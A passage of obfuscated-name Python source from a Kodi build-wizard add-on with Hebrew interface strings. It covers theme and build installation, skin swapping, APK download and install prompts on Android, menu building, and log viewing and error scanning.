				O00O00O0OO0000O00 =testGui (OO00000O00O0O0OO0 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4556
				if O0O000OOO0O0O00O0 ==True :#line:4557
					wiz .lookandFeelData ('save')#line:4558
					O0OO00OOO0OO00000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4559
					O00000O0OOOOOOOOO =xbmc .getSkinDir ()#line:4560
					skinSwitch .swapSkins (O0OO00OOO0OO00000 )#line:4562
					O00OOOO0OOO00O0O0 =0 #line:4563
					xbmc .sleep (1000 )#line:4564
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OOOO0OOO00O0O0 <150 :#line:4565
						O00OOOO0OOO00O0O0 +=1 #line:4566
						xbmc .sleep (1000 )#line:4567
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4568
						wiz .ebi ('SendClick(11)')#line:4569
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4570
					xbmc .sleep (1000 )#line:4571
			OO000O0OO000O000O ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4572
			DP .update (0 ,OO000O0OO000O000O ,'','אנא המתן')#line:4573
			OOO0OOOOOO00OOOOO ,O0O0OOOO0O00000OO ,OO0O0OOO0OO0OOO0O =extract .all (OO00000O00O0O0OO0 ,HOME ,DP ,title =OO000O0OO000O000O )#line:4574
			wiz .setS ('buildtheme',theme )#line:4575
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OOO0OOOOOO00OOOOO ,O0O0OOOO0O00000OO ))#line:4576
			DP .close ()#line:4577
			if url not in ["fresh","normal"]:#line:4578
				wiz .forceUpdate ()#line:4579
				if KODIV >=17 :wiz .kodi17Fix ()#line:4580
				if O00O00O0OO0000O00 ==True :#line:4581
					wiz .lookandFeelData ('save')#line:4582
					wiz .defaultSkin ()#line:4583
					O00000O0OOOOOOOOO =wiz .getS ('defaultskin')#line:4584
					skinSwitch .swapSkins (O00000O0OOOOOOOOO )#line:4585
					O00OOOO0OOO00O0O0 =0 #line:4586
					xbmc .sleep (1000 )#line:4587
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OOOO0OOO00O0O0 <150 :#line:4588
						O00OOOO0OOO00O0O0 +=1 #line:4589
						xbmc .sleep (1000 )#line:4590
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4592
						wiz .ebi ('SendClick(11)')#line:4593
					wiz .lookandFeelData ('restore')#line:4594
				elif O0O000OOO0O0O00O0 ==True :#line:4595
					skinSwitch .swapSkins (O00000O0OOOOOOOOO )#line:4596
					O00OOOO0OOO00O0O0 =0 #line:4597
					xbmc .sleep (1000 )#line:4598
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OOOO0OOO00O0O0 <150 :#line:4599
						O00OOOO0OOO00O0O0 +=1 #line:4600
						xbmc .sleep (1000 )#line:4601
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4603
						wiz .ebi ('SendClick(11)')#line:4604
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4605
					wiz .lookandFeelData ('restore')#line:4606
				else :#line:4607
					wiz .ebi ("ReloadSkin()")#line:4608
					xbmc .sleep (1000 )#line:4609
					wiz .ebi ("Container.Refresh")#line:4610
		else :#line:4611
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4612
def skin_homeselect ():#line:4616
	try :#line:4618
		O0OOO0000OO0O0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4619
		O0000OO00OOOOOO0O =open (O0OOO0000OO0O0O0O ,'r')#line:4621
		O0O0000O00000OOOO =O0000OO00OOOOOO0O .read ()#line:4622
		O0000OO00OOOOOO0O .close ()#line:4623
		O0OO0000O00O00OO0 ='<setting id="FirstRunSetup" type="bool(.+?)/setting>'#line:4624
		O0O00O00OO00O0O0O =re .compile (O0OO0000O00O00OO0 ).findall (O0O0000O00000OOOO )[0 ]#line:4625
		O0000OO00OOOOOO0O =open (O0OOO0000OO0O0O0O ,'w')#line:4626
		O0000OO00OOOOOO0O .write (O0O0000O00000OOOO .replace ('<setting id="FirstRunSetup" type="bool%s/setting>'%O0O00O00OO00O0O0O ,'<setting id="FirstRunSetup" type="bool"></setting>'))#line:4627
		O0000OO00OOOOOO0O .close ()#line:4628
	except :#line:4629
		pass #line:4630
def skin_lower ():#line:4633
	O0OO0000OOO0OOOOO =(ADDON .getSetting ("lower"))#line:4634
	if O0OO0000OOO0OOOOO =='true':#line:4635
		try :#line:4638
			O00000OO000O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4639
			O0OO0OO000OO00OO0 =open (O00000OO000O00OO0 ,'r')#line:4641
			OOO0O0OOOO0O00O0O =O0OO0OO000OO00OO0 .read ()#line:4642
			O0OO0OO000OO00OO0 .close ()#line:4643
			O000O0000O0O00O0O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4644
			OO000O0OOO0OOO0OO =re .compile (O000O0000O0O00O0O ).findall (OOO0O0OOOO0O00O0O )[0 ]#line:4645
			O0OO0OO000OO00OO0 =open (O00000OO000O00OO0 ,'w')#line:4646
			O0OO0OO000OO00OO0 .write (OOO0O0OOOO0O00O0O .replace ('<setting id="none_widget" type="bool%s/setting>'%OO000O0OOO0OOO0OO ,'<setting id="none_widget" type="bool">true</setting>'))#line:4647
			O0OO0OO000OO00OO0 .close ()#line:4648
		except :#line:4714
			pass #line:4715
def thirdPartyInstall (OO0OOO00000O0O0OO ,OOOO0O0O00OO0OOOO ):#line:4717
	if not wiz .workingURL (OOOO0O0O00OO0OOOO ):#line:4718
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4719
	OO00OOOO0000OO0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOO00000O0O0OO ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4720
	if OO00OOOO0000OO0O0 ==1 :#line:4721
		freshStart ('third',True )#line:4722
	wiz .clearS ('build')#line:4723
	O0O0000OOO0000O0O =OO0OOO00000O0O0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4724
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4725
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOO00000O0O0OO ),'','אנא המתן')#line:4726
	OO0O000OO00O0O0O0 =os .path .join (PACKAGES ,'%s.zip'%O0O0000OOO0000O0O )#line:4727
	try :os .remove (OO0O000OO00O0O0O0 )#line:4728
	except :pass #line:4729
	downloader .download (OOOO0O0O00OO0OOOO ,OO0O000OO00O0O0O0 ,DP )#line:4730
	xbmc .sleep (1000 )#line:4731
	O0O0O0OOOOO0O0O0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOO00000O0O0OO )#line:4732
	DP .update (0 ,O0O0O0OOOOO0O0O0O ,'','אנא המתן')#line:4733
	OO000OO000000O0O0 ,OO0OOO0O0000OO0O0 ,O0O0OO0OOO00000O0 =extract .all (OO0O000OO00O0O0O0 ,HOME ,DP ,title =O0O0O0OOOOO0O0O0O )#line:4734
	if int (float (OO000OO000000O0O0 ))>0 :#line:4735
		wiz .fixmetas ()#line:4736
		wiz .lookandFeelData ('save')#line:4737
		wiz .defaultSkin ()#line:4738
		wiz .setS ('installed','true')#line:4740
		wiz .setS ('extract',str (OO000OO000000O0O0 ))#line:4741
		wiz .setS ('errors',str (OO0OOO0O0000OO0O0 ))#line:4742
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO000OO000000O0O0 ,OO0OOO0O0000OO0O0 ))#line:4743
		try :os .remove (OO0O000OO00O0O0O0 )#line:4744
		except :pass #line:4745
		if int (float (OO0OOO0O0000OO0O0 ))>0 :#line:4746
			OOOO0O0O0OO0000O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOO00000O0O0OO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OO000OO000000O0O0 ,'%',COLOR1 ,OO0OOO0O0000OO0O0 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4747
			if OOOO0O0O0OO0000O0 :#line:4748
				if isinstance (OO0OOO0O0000OO0O0 ,unicode ):#line:4749
					O0O0OO0OOO00000O0 =O0O0OO0OOO00000O0 .encode ('utf-8')#line:4750
				wiz .TextBox (ADDONTITLE ,O0O0OO0OOO00000O0 )#line:4751
	DP .close ()#line:4752
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4753
	if INSTALLMETHOD ==1 :O0OOOO0OOO0OOO0O0 =1 #line:4754
	elif INSTALLMETHOD ==2 :O0OOOO0OOO0OOO0O0 =0 #line:4755
	else :O0OOOO0OOO0OOO0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4756
	if O0OOOO0OOO0OOO0O0 ==1 :wiz .reloadFix ()#line:4757
	else :wiz .killxbmc (True )#line:4758
def testTheme (O00OOOOO00OOOO000 ):#line:4760
	O0O0O00O00OO00OOO =zipfile .ZipFile (O00OOOOO00OOOO000 )#line:4761
	for O00000OO0OO0OO0O0 in O0O0O00O00OO00OOO .infolist ():#line:4762
		if '/settings.xml'in O00000OO0OO0OO0O0 .filename :#line:4763
			return True #line:4764
	return False #line:4765
def testGui (O0O0O00OOOOO0OO0O ):#line:4767
	O0OO00O0OOO0OOO0O =zipfile .ZipFile (O0O0O00OOOOO0OO0O )#line:4768
	for O00OOOOO0O0OOO00O in O0OO00O0OOO0OOO0O .infolist ():#line:4769
		if '/guisettings.xml'in O00OOOOO0O0OOO00O .filename :#line:4770
			return True #line:4771
	return False #line:4772
def apkInstaller (O0OOO0OOO0OO000O0 ,OO000OOOOOO0OO000 ):#line:4774
	wiz .log (O0OOO0OOO0OO000O0 )#line:4775
	wiz .log (OO000OOOOOO0OO000 )#line:4776
	if wiz .platform ()=='android':#line:4777
		OO0O00O0O0000O0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOO0OOO0OO000O0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4778
		if not OO0O00O0O0000O0OO :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4779
		OOOO000OOOOO00OO0 =O0OOO0OOO0OO000O0 #line:4780
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4781
		if not wiz .workingURL (OO000OOOOOO0OO000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4782
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000OOOOO00OO0 ),'','אנא המתן')#line:4783
		OOO0OO0OOO0000OO0 =os .path .join (PACKAGES ,"%s.apk"%O0OOO0OOO0OO000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4784
		try :os .remove (OOO0OO0OOO0000OO0 )#line:4785
		except :pass #line:4786
		downloader .download (OO000OOOOOO0OO000 ,OOO0OO0OOO0000OO0 ,DP )#line:4787
		xbmc .sleep (100 )#line:4788
		DP .close ()#line:4789
		notify .apkInstaller (O0OOO0OOO0OO000O0 )#line:4790
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OOO0OO0OOO0000OO0 +'")')#line:4791
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4792
def createMenu (OO0OOOO0OO000OO0O ,OOO00OOO0O0OOOOO0 ,O000O0000OOOO0OO0 ):#line:4798
	if OO0OOOO0OO000OO0O =='saveaddon':#line:4799
		O00OO000O00OO000O =[]#line:4800
		OO00OOO000O000000 =urllib .quote_plus (OOO00OOO0O0OOOOO0 .lower ().replace (' ',''))#line:4801
		O0OOO0OO0O000OOOO =OOO00OOO0O0OOOOO0 .replace ('Debrid','Real Debrid')#line:4802
		O0O00OOO0OOOOO00O =urllib .quote_plus (O000O0000OOOO0OO0 .lower ().replace (' ',''))#line:4803
		O000O0000OOOO0OO0 =O000O0000OOOO0OO0 .replace ('url','URL Resolver')#line:4804
		O00OO000O00OO000O .append ((THEME2 %O000O0000OOOO0OO0 .title (),' '))#line:4805
		O00OO000O00OO000O .append ((THEME3 %'Save %s Data'%O0OOO0OO0O000OOOO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO00OOO000O000000 ,O0O00OOO0OOOOO00O )))#line:4806
		O00OO000O00OO000O .append ((THEME3 %'Restore %s Data'%O0OOO0OO0O000OOOO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO00OOO000O000000 ,O0O00OOO0OOOOO00O )))#line:4807
		O00OO000O00OO000O .append ((THEME3 %'Clear %s Data'%O0OOO0OO0O000OOOO ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OO00OOO000O000000 ,O0O00OOO0OOOOO00O )))#line:4808
	elif OO0OOOO0OO000OO0O =='save':#line:4809
		O00OO000O00OO000O =[]#line:4810
		OO00OOO000O000000 =urllib .quote_plus (OOO00OOO0O0OOOOO0 .lower ().replace (' ',''))#line:4811
		O0OOO0OO0O000OOOO =OOO00OOO0O0OOOOO0 .replace ('Debrid','Real Debrid')#line:4812
		O0O00OOO0OOOOO00O =urllib .quote_plus (O000O0000OOOO0OO0 .lower ().replace (' ',''))#line:4813
		O000O0000OOOO0OO0 =O000O0000OOOO0OO0 .replace ('url','URL Resolver')#line:4814
		O00OO000O00OO000O .append ((THEME2 %O000O0000OOOO0OO0 .title (),' '))#line:4815
		O00OO000O00OO000O .append ((THEME3 %'Register %s'%O0OOO0OO0O000OOOO ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OO00OOO000O000000 ,O0O00OOO0OOOOO00O )))#line:4816
		O00OO000O00OO000O .append ((THEME3 %'Save %s Data'%O0OOO0OO0O000OOOO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO00OOO000O000000 ,O0O00OOO0OOOOO00O )))#line:4817
		O00OO000O00OO000O .append ((THEME3 %'Restore %s Data'%O0OOO0OO0O000OOOO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO00OOO000O000000 ,O0O00OOO0OOOOO00O )))#line:4818
		O00OO000O00OO000O .append ((THEME3 %'Import %s Data'%O0OOO0OO0O000OOOO ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OO00OOO000O000000 ,O0O00OOO0OOOOO00O )))#line:4819
		O00OO000O00OO000O .append ((THEME3 %'Clear Addon %s Data'%O0OOO0OO0O000OOOO ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OO00OOO000O000000 ,O0O00OOO0OOOOO00O )))#line:4820
	elif OO0OOOO0OO000OO0O =='install':#line:4821
		O00OO000O00OO000O =[]#line:4822
		O0O00OOO0OOOOO00O =urllib .quote_plus (O000O0000OOOO0OO0 )#line:4823
		O00OO000O00OO000O .append ((THEME2 %O000O0000OOOO0OO0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O0O00OOO0OOOOO00O )))#line:4824
		O00OO000O00OO000O .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O0O00OOO0OOOOO00O )))#line:4825
		O00OO000O00OO000O .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O0O00OOO0OOOOO00O )))#line:4826
		O00OO000O00OO000O .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O0O00OOO0OOOOO00O )))#line:4827
		O00OO000O00OO000O .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O0O00OOO0OOOOO00O )))#line:4828
	O00OO000O00OO000O .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4829
	return O00OO000O00OO000O #line:4830
def toggleCache (O0O0O0000O00O0O0O ):#line:4832
	OO0OO00O000O0OO0O =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4833
	OO000O00OOO0OO000 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4834
	if O0O0O0000O00O0O0O in ['true','false']:#line:4835
		for OOO0O0OOO0000OOOO in OO0OO00O000O0OO0O :#line:4836
			wiz .setS (OOO0O0OOO0000OOOO ,O0O0O0000O00O0O0O )#line:4837
	else :#line:4838
		if not O0O0O0000O00O0O0O in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4839
			try :#line:4840
				OOO0O0OOO0000OOOO =OO000O00OOO0OO000 [OO0OO00O000O0OO0O .index (O0O0O0000O00O0O0O )]#line:4841
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OOO0O0OOO0000OOOO ))#line:4842
			except :#line:4843
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O0O0O0000O00O0O0O ))#line:4844
		else :#line:4845
			O00000OOO0O00OOOO ='true'if wiz .getS (O0O0O0000O00O0O0O )=='false'else 'false'#line:4846
			wiz .setS (O0O0O0000O00O0O0O ,O00000OOO0O00OOOO )#line:4847
def playVideo (OOOO0O0OO000O00OO ):#line:4849
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OOOO0O0OO000O00OO )#line:4850
	if 'watch?v='in OOOO0O0OO000O00OO :#line:4851
		OO000O00OOOO0O0OO ,O00O00OOO000O0OO0 =OOOO0O0OO000O00OO .split ('?')#line:4852
		O00OO0O0O0000O0OO =O00O00OOO000O0OO0 .split ('&')#line:4853
		for OO000OO0OO0O0OOO0 in O00OO0O0O0000O0OO :#line:4854
			if OO000OO0OO0O0OOO0 .startswith ('v='):#line:4855
				OOOO0O0OO000O00OO =OO000OO0OO0O0OOO0 [2 :]#line:4856
				break #line:4857
			else :continue #line:4858
	elif 'embed'in OOOO0O0OO000O00OO or 'youtu.be'in OOOO0O0OO000O00OO :#line:4859
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OOOO0O0OO000O00OO )#line:4860
		OO000O00OOOO0O0OO =OOOO0O0OO000O00OO .split ('/')#line:4861
		if len (OO000O00OOOO0O0OO [-1 ])>5 :#line:4862
			OOOO0O0OO000O00OO =OO000O00OOOO0O0OO [-1 ]#line:4863
		elif len (OO000O00OOOO0O0OO [-2 ])>5 :#line:4864
			OOOO0O0OO000O00OO =OO000O00OOOO0O0OO [-2 ]#line:4865
	wiz .log ("YouTube URL: %s"%OOOO0O0OO000O00OO )#line:4866
	yt .PlayVideo (OOOO0O0OO000O00OO )#line:4867
def viewLogFile ():#line:4869
	O0O0000O000O0O00O =wiz .Grab_Log (True )#line:4870
	OOOO000000O0OOOO0 =wiz .Grab_Log (True ,True )#line:4871
	O0OOO000OO00OOO00 =0 ;OOO0O0OOOO00000O0 =O0O0000O000O0O00O #line:4872
	if not OOOO000000O0OOOO0 ==False and not O0O0000O000O0O00O ==False :#line:4873
		O0OOO000OO00OOO00 =DIALOG .select (ADDONTITLE ,["View %s"%O0O0000O000O0O00O .replace (LOG ,""),"View %s"%OOOO000000O0OOOO0 .replace (LOG ,"")])#line:4874
		if O0OOO000OO00OOO00 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4875
	elif O0O0000O000O0O00O ==False and OOOO000000O0OOOO0 ==False :#line:4876
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4877
		return #line:4878
	elif not O0O0000O000O0O00O ==False :O0OOO000OO00OOO00 =0 #line:4879
	elif not OOOO000000O0OOOO0 ==False :O0OOO000OO00OOO00 =1 #line:4880
	OOO0O0OOOO00000O0 =O0O0000O000O0O00O if O0OOO000OO00OOO00 ==0 else OOOO000000O0OOOO0 #line:4882
	O0OOO00O000OOO000 =wiz .Grab_Log (False )if O0OOO000OO00OOO00 ==0 else wiz .Grab_Log (False ,True )#line:4883
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OOO0O0OOOO00000O0 ),O0OOO00O000OOO000 )#line:4885
def errorChecking (log =None ,count =None ,all =None ):#line:4887
	if log ==None :#line:4888
		O0OO0OOOOO00OOO00 =wiz .Grab_Log (True )#line:4889
		O0000O0OO0OO0O00O =wiz .Grab_Log (True ,True )#line:4890
		if not O0000O0OO0OO0O00O ==False and not O0OO0OOOOO00OOO00 ==False :#line:4891
			OO0OO00O00O00O00O =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0OO0OOOOO00OOO00 .replace (LOG ,""),errorChecking (O0OO0OOOOO00OOO00 ,True ,True )),"View %s: %s error(s)"%(O0000O0OO0OO0O00O .replace (LOG ,""),errorChecking (O0000O0OO0OO0O00O ,True ,True ))])#line:4892
			if OO0OO00O00O00O00O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4893
		elif O0OO0OOOOO00OOO00 ==False and O0000O0OO0OO0O00O ==False :#line:4894
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4895
			return #line:4896
		elif not O0OO0OOOOO00OOO00 ==False :OO0OO00O00O00O00O =0 #line:4897
		elif not O0000O0OO0OO0O00O ==False :OO0OO00O00O00O00O =1 #line:4898
		log =O0OO0OOOOO00OOO00 if OO0OO00O00O00O00O ==0 else O0000O0OO0OO0O00O #line:4899
	if log ==False :#line:4900
		if count ==None :#line:4901
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4902
			return False #line:4903
		else :#line:4904
			return 0 #line:4905
	else :#line:4906
		if os .path .exists (log ):#line:4907
			OO0O00OO00OOO0O0O =open (log ,mode ='r');O000O0O00O0000O00 =OO0O00OO00OOO0O0O .read ().replace ('\n','').replace ('\r','');OO0O00OO00OOO0O0O .close ()#line:4908
			O000O0OO0O0000OOO =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O000O0O00O0000O00 )#line:4909
			if not count ==None :#line:4910
				if all ==None :#line:4911
					O0O000O0OO0OO0OO0 =0 #line:4912
					for OO0O0OOO0OOO0OO0O in O000O0OO0O0000OOO :#line:4913
						if ADDON_ID in OO0O0OOO0OOO0OO0O :O0O000O0OO0OO0OO0 +=1 #line:4914
					return O0O000O0OO0OO0OO0 #line:4915
				else :return len (O000O0OO0O0000OOO )#line:4916
			if len (O000O0OO0O0000OOO )>0 :#line:4917
				O0O000O0OO0OO0OO0 =0 ;OOO000O000000OO0O =""#line:4918
				for OO0O0OOO0OOO0OO0O in O000O0OO0O0000OOO :#line:4919
					if all ==None and not ADDON_ID in OO0O0OOO0OOO0OO0O :continue #line:4920
					else :#line:4921
						O0O000O0OO0OO0OO0 +=1 #line:4922
						OOO000O000000OO0O +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O0O000O0OO0OO0OO0 ,OO0O0OOO0OOO0OO0O .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4923
				if O0O000O0OO0OO0OO0 >0 :#line:4924
					wiz .TextBox (ADDONTITLE ,OOO000O000000OO0O )#line:4925
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4926
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4927
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4928
ACTION_PREVIOUS_MENU =10 #line:4930
ACTION_NAV_BACK =92 #line:4931
ACTION_MOVE_LEFT =1 #line:4932
ACTION_MOVE_RIGHT =2 #line:4933
ACTION_MOVE_UP =3 #line:4934
ACTION_MOVE_DOWN =4 #line:4935
ACTION_MOUSE_WHEEL_UP =104 #line:4936
ACTION_MOUSE_WHEEL_DOWN =105 #line:4937
ACTION_MOVE_MOUSE =107 #line:4938
ACTION_SELECT_ITEM =7 #line:4939
ACTION_BACKSPACE =110 #line:4940
ACTION_MOUSE_LEFT_CLICK =100 #line:4941
ACTION_MOUSE_LONG_CLICK =108 #line:4942
def LogViewer (default =None ):#line:4944
	class OO000OO000O0OO0O0 (xbmcgui .WindowXMLDialog ):#line:4945
		def __init__ (O0OOOOO0O00OOOO00 ,*OOO00000O000O0OO0 ,**OO0OOO0000OOO0O00 ):#line:4946
			O0OOOOO0O00OOOO00 .default =OO0OOO0000OOO0O00 ['default']#line:4947
		def onInit (OOOO00O0OO00OOOOO ):#line:4949
			OOOO00O0OO00OOOOO .title =101 #line:4950
			OOOO00O0OO00OOOOO .msg =102 #line:4951
			OOOO00O0OO00OOOOO .scrollbar =103 #line:4952
			OOOO00O0OO00OOOOO .upload =201 #line:4953
			OOOO00O0OO00OOOOO .kodi =202 #line:4954
			OOOO00O0OO00OOOOO .kodiold =203 #line:4955
			OOOO00O0OO00OOOOO .wizard =204 #line:4956
			OOOO00O0OO00OOOOO .okbutton =205 #line:4957
			O0O000OO00O0OO000 =open (OOOO00O0OO00OOOOO .default ,'r')#line:4958
			OOOO00O0OO00OOOOO .logmsg =O0O000OO00O0OO000 .read ()#line:4959
			O0O000OO00O0OO000 .close ()#line:4960
			OOOO00O0OO00OOOOO .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO00O0OO00OOOOO .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4961
			OOOO00O0OO00OOOOO .showdialog ()#line:4962
		def showdialog (OO0O00OO0O0O0000O ):#line:4964
			OO0O00OO0O0O0000O .getControl (OO0O00OO0O0O0000O .title ).setLabel (OO0O00OO0O0O0000O .titlemsg )#line:4965
			OO0O00OO0O0O0000O .getControl (OO0O00OO0O0O0000O .msg ).setText (wiz .highlightText (OO0O00OO0O0O0000O .logmsg ))#line:4966
			OO0O00OO0O0O0000O .setFocusId (OO0O00OO0O0O0000O .scrollbar )#line:4967
		def onClick (O000O0OOOOOO0OOO0 ,OOO0O0000O000OO00 ):#line:4969
			if OOO0O0000O000OO00 ==O000O0OOOOOO0OOO0 .okbutton :O000O0OOOOOO0OOO0 .close ()#line:4970
			elif OOO0O0000O000OO00 ==O000O0OOOOOO0OOO0 .upload :O000O0OOOOOO0OOO0 .close ();uploadLog .Main ()#line:4971
